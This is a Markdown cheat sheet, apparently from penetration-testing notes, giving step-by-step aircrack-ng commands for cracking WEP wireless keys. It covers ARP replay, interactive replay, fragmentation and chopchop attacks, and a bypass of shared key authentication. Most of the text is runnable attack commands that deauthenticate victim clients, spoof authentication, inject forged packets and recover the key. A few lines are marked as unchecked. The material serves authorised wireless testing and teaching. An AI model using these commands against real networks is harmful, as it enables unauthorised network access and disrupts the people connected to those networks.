# Wifi - WEP Cracking

## Cracking WEP with a Client

### ARP Request Replay Attack

> Attack the ACCESS POINT

```powershell
airmon-ng start wlan0 3 # only a particular channel : 3
airodump-ng mon0 -c 3 --bssid $AP_MAC -w arpreplay # dump traffic

# Fake authentication for a more reliable attack
aireplay-ng -1 0 -e $AP_SSID -b $AP_MAC -h $ATTACKER_MAC mon0

# ARP replay attack
aireplay-ng -3 -b $AP_MAC -h $ATTACKER_MAC mon0

# Deauthentication
aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0

# Cracking
aircrack-ng arpreplay.cap
```


### Interactive replay attack

> Attack a client to force new packets 0841 attack, or interactive packet replay is a WEP attack that allows for packet injection when ARP replay is not available/working.

```powershell
airmon-ng start wlan0 3 # only a particular channel : 3
airodump-ng -c 3 --bssid $AP_MAC -w clearcap mon0 # dump traffic

# fake authentication for a more reliable attack
aireplay-ng -1 0 -e $AP_SSID -b $AP_MAC -h $ATTACKER_MAC mon0

# interactive replay attack (min arp 68, max arp 86)
aireplay-ng -2 -b $AP_MAC -d FF:FF:FF:FF:FF -f 1 -m 68 -n 86 mon0 # interactive - natural selection of a packet
aireplay-ng -2 -b $AP_MAC -t 1 -c FF:FF:FF:FF:FF:FF -p 0841 mon0  # interactive - force create a packet
# Packet selection (ARP packets met the characteristics): 
# - APs will always repeat packets destined to the broadcast
# - The packet will have the ToDS (To Distribution System) bit set to 1
# answer "y" multiple times

# cracking require ~> 250000 IVs
aircrack-ng -0 -z -n 64 clientwep-01.cap
    * -z: PTW attack
    * -n: number of bits in the WEP key

# backup file with an ARP packet
aireplay-ng -2 -r replay.cap mon0
```


## Cracking WEP without a Client

* Chopchop & Fragmentation attack => PRGA, generate more packets with weak IVs
* Need an AP configured with open system authentication

Prerequisite:

```powershell
# put into monitor mode on our desired channel
airmon-ng start wlan0 3 # only a particular channel : 3
airodump-ng -c 3 --bssid $AP_MAC -w wepcrack mon0 # see no client

# fake authentication attack with association timing (every 60s try to reassociate)
aireplay-ng -1 60 -e $AP_SSID -b $AP_MAC -h $ATTACKER_MAC mon0 # should see a client in airodump
# -1 6000 to avoid a time out.
```


### Fragmentation attack

> Goal: 1500 bytes of PRGA Atheros does not generate the correct packets unless the wireless card is set to the MAC address you are spoofing.

```powershell
# attacker mac must be associated (fake auth)
# Press "Y"
aireplay-ng -5 -b $AP_MAC -h $ATTACKER_MAC mon0

# use our PRGA from the fragmentation attack to generate an ARP request
# SRC_ADDR: 192.168.1.100 
# DST_ADDR: 192.168.1.255, should not exist (broadcast address)
packetforge-ng -0 -a $AP_MAC -h $ATTACKER_MAC -l $SRC_ADDR -k $DST_ADDR -y frag.xor -w inject.cap
# -k: the destination IP i.e. in ARP, this is "Who has this IP"
# -l: the source IP i.e. in ARP, this is "Tell this IP"

# check the packet
tcpdump -n -vvv -e -s0 -r inject.cap

# inject our crafted packet
aireplay-ng -2 -r inject.cap mon0

# crack the WEP key
# Aircrack-ng will auto-update when new IVs are available
aircrack-ng -0 wepcrack

# if 64-bit WEP is used, cracking time < 5 minutes 
# switch to 128-bit keys after 600000 IVs
# use the `-f 4` after 2000000
aircrack-ng -n 64 <capture filename>
```


### KoreK Chopchop attack

> Can't be used for every AP, might work when fragmentation fails Much slower than the fragmentation attack

```powershell
# chopchop attack: -4
# out decrypted: .cap
# out prga: .xor
# Press "Y" (choose a small packet)
aireplay-ng -4 -b $AP_MAC -h $ATTACKER_MAC mon0

# check the packet and find the network addresses
tcpdump -n -vvv -e -s0 -r inject.cap

# use our PRGA from the fragmentation attack
# SRC_ADDR: 192.168.1.100 
# DST_ADDR: 192.168.1.255, should not exist (broadcast address)
packetforge-ng -0 -a $AP_MAC -h $ATTACKER_MAC -l $SRC_ADDR -k $DST_ADDR -y prga.xor -w chochop_out.cap

# inject our crafted packet
aireplay-ng -2 -r chochop_out.cap mon0

# crack the WEP key
aircrack-ng -0 wepcrack
```


## Bypassing WEP Shared Key Authentication SKA

> By default, most wireless drivers will attempt open authentication first. If open authentication fails, they will proceed to try shared authentication.

Prerequisite:

* Authentication: Shared Key
* When Fake Authentication => `AP rejects open-system authentication`

```powershell
# put into monitor mode on our desired channel
airmon-ng start wlan0 3 # only a particular channel : 3
airodump-ng -c 3 --bssid $AP_MAC -w sharedkey mon0

# deauthentication attack on the connected client
# airodump should display SKA under the AUTH column
# PRGA file will be saved as xxxx.xor
aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0
# TO CHECK aireplay-ng -0 10 –a $AP_MAC -c $VICTIM_MAC mon0

# fake authentication attack with association timing (every 60s try to reassociate)
# should display switching to Shared Key Authentication
# If you are using a PRGA  file obtained  from a chopchop attack, make sure that it is at least 144 bytes long
# If you have "Part2:  Association  Not  answering...(Step3)" -> spoof the mac address used to fake auth
aireplay-ng -1 60 -e $AP_SSID -y sharedkey.xor -b $AP_MAC -h $ATTACKER_MAC mon0

# ARP replay attack
aireplay-ng -3 -b $AP_MAC -h $ATTACKER_MAC mon0

# deauthentication attack on the connected client
# speed the ARP attack process using deauth
aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0
# TO CHECK: aireplay-ng –-deauth 1 –a $AP_MAC -h <FakedMac> wlan0mon

# crack the WEP key
aircrack-ng sharedkey.cap
```


## References

* [TODO](TODO)